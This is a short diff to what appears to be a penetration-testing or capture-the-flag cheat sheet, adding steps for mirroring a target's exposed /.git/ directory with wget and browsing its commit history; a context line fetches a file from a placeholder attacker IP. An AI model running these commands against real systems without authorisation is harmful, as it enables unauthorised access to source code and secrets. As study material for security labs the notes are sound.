@@ -87,3 +87,10 @@ wget http://<attack-ip>:8080/file
 # Extract from cli
 - Use command: `7z e file.zip`
 
+# How to deal with a /.git/?
+- Download the full repository: `wget --mirror http://<ip-target>/.git/`
+- Once downloaded follow this steps:
+	- Look at the commits: `git log --oneline`
+	- Go down the history: `git checkout <commit> --force`
+	- Now inspect the commit
+
